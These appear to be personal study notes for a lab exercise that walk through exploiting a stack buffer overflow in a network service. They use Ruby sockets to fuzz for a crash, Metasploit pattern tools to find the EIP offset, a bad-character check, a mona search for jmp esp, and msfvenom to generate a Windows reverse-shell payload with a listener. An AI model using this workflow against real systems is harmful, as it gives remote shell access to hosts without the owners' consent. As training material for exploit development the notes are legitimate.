use pry --simple-prompt to open ruby, then use 
	s=TCPSocket.new("ip address",port) 
	*NOTE* I will have to do this command every so often, it will be obvious when to.
To interact with the service 
	use s = TCPSocket.new "targetIP",TargetPort
	s.gets
	s.puts "Hello BoF!"
	s.gets
If it can interact with us, we will see "Hello BoF!" in response.
To see where it crashes, use the following command, increasing until the program crashes in Immunity Debugger
	s.puts "A"*200
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l *round up on bytes that crashed*
Copy the above code, and use
	s.puts "pattern create value"
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l *round up on bytes that crashed* -q *EIP finding* 
	the above will tell you the exact match location
To confirm the offset value, use
	s.puts "A"*value+"B"*4
use badchars.rb, follow ESP in dump, and search for bad chars.
	it goes 1-9, a-f, then 10, through 90. then it goes a0-a9, then aa-af, through ff.
use !mona modules and look for the appropriate module (hopefully all false)
use !mona jmp -r esp -m *module* to find if a jmp esp module exists.
	in the list the shows, just go down the list in the python script on line 15 until one works
Convert the found module to Little Endian format in the shell.rb 
	The values furthest left, backwards. example: 080414C3 is "\xC3\x14\x04\x08"
msfvenom -p windows/x64/shell_reverse_tcp lhost=<IP> lport=<PORT> -b "bad chars" -f rb (with and without x64)
take the overflow and put it in shell.rb. Set up a listener to the one set in msfvenom, then Test against lab first, then attack machine
use ruby shell.rb
